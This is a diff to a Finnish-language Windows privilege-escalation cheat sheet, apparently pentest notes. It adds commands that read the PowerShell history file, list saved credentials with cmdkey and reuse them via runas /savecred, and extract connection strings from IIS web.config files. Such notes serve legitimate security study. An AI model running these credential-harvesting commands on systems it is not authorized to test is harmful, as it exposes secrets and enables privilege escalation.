@@ -22,14 +22,23 @@ C:\Windows\system32\sysprep\sysprep.xml
 ```
 Powershell-historia (cmd.exe ajettuna):
 ```cmd
-%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 Tallennetut käyttäjätunnukset:
 ```cmd
 cmdkey /list
 ```
-Jos löytyy jotain, niin:
+Jos löytyy kokeilemisen arvoisia, niin:
 ```cmd
-runas /savecred /user:admin cmd.exe
+runas /savecred /user:USERNAME cmd.exe
 ```
+IIS konfiguraatioon tallennetut tunnukset:
+```cmd
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+```cmd
+type C:\inetpub\wwwroot\web.config | findstr connectionString
+```
+
+
